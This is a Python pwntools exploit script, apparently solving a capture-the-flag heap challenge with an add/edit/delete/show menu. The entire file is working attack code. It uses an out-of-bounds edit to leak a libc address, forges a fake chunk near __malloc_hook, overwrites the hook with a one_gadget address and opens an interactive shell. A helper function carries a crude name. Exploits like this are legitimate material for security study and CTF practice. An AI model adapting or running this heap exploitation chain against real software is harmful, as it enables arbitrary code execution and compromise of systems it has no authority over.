#coding=utf-8
from pwn import *
local = 1
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    
    b *($text_base+0x0000000000000D1E)
    b *($text_base+0x0000000000000E56)
    b *($text_base+0x00000000000010C3)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("5.Exit\n",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("3.Large\n",str(size))
    a.sendafter("Input Content:\n",content)

def edit(idx,offset,content):
    menu(2)
    a.sendlineafter("Which one do you want to update?\n",str(idx))
    a.sendlineafter("Where you want to update?",str(offset))
    a.sendafter("Input Content:\n",content)
def show(idx):
    menu(4)
    a.sendlineafter("Which one do you want to view?\n",str(idx))
def delete(idx):
    menu(3)
    a.sendlineafter("Which one do you want to delete?\n",str(idx))

add(2,'A\n')#0 0
add(2,'A\n')#1 0x40 
add(2,'A\n')#2 0x80
add(2,'A\n')#3 0xc0
add(1,'A\n')#4
add(1,'A\n')#5
edit(1,0x80000000,'A'*0x18+p64(0xf1)+'\n')
#debug()

delete(1)

add(2,'A\n')#6
show(2)
libc_base=u64(a.recv(6)+'\x00\x00')-libc.symbols["__malloc_hook"]-0x10-88
fuck(libc_base)
#debug()
add(2,'A\n')#7 = 2
add(3,'A\n')#8 = 3
#debug()
fake_chunk_addr = libc_base+libc.symbols["__malloc_hook"]+0x10+0x10
delete(2)
edit(7,0,p64(0x51)+'\n')
add(2,'A\n')#9
__malloc_hook = libc_base+libc.symbols["__malloc_hook"]
delete(8)
edit(3,0,p64(fake_chunk_addr)+'\n')
add(3,'A\n')#10
add(3,'\x00'*0x38+p64(__malloc_hook-0x10))

delete(9)
edit(7,0,p64(0)+'\n')
add(2,'A\n')#11
one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
one = libc_base+one_offset[3]
add(3,p64(one)+'\n')
menu(1)
a.sendlineafter("3.Large\n",str(1))
#debug()
a.interactive()









